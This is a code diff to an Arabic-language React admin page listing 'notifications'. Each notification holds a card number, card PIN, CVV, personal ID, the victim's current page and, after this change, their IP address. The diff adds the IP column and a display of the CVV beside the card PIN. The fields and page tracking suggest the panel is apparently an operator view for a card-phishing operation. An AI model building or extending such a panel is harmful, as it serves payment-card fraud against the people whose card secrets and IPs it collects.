@@ -39,6 +39,7 @@ interface Notification {
   bank_card: string
   cardNumber: string
   cardStatus: string
+  ip?: string;
   createdDate: string
   cvv: string
   id: string | "0"
@@ -275,7 +276,7 @@ export default function NotificationsPage() {
 
   return (
     <div dir="rtl" className="min-h-screen bg-gray-300 text-black p-4">
-      <div className="max-w-7xl mx-auto">
+      <div className=" mx-auto">
         <div className="flex flex-col sm:flex-row justify-between items-center mb-6">
           <h1 className="text-xl font-semibold mb-4 sm:mb-0">جميع الإشعارات</h1>
           <div className="flex flex-col sm:flex-row gap-2">
@@ -333,6 +334,7 @@ export default function NotificationsPage() {
           <table className="w-full">
             <thead>
               <tr className="border-b border-gray-100">
+                <th className="px-4 py-3 text-right">ip</th>
                 <th className="px-4 py-3 text-right">الإسم</th>
                 <th className="px-4 py-3 text-right">المعلومات</th>
                 <th className="px-4 py-3 text-right">الصفحة الحالية</th>
@@ -345,6 +347,7 @@ export default function NotificationsPage() {
             <tbody>
               {notifications.map((notification) => (
                 <tr key={notification.id} className="border-b border-gray-700">
+                  <td className="px-4 py-3">{notification?.ip!}</td>
                   <td className="px-4 py-3">{notification.personalInfo?.id!}</td>
                   <td className="px-4 py-3">
                     <div className="flex flex-col sm:flex-row gap-2">
@@ -487,7 +490,9 @@ export default function NotificationsPage() {
               <p className="flex items-center">
                 <strong className="text-red-400 mx-4">رمز البطاقة :</strong> {selectedNotification.pass}
               </p>
-           
+             <p className="flex items-center">
+                <strong className="text-red-400 mx-4">رمز الامان :</strong> {selectedNotification?.cvv! }
+              </p>
             </div>
           )}
           {selectedInfo === "personal" && selectedNotification && (
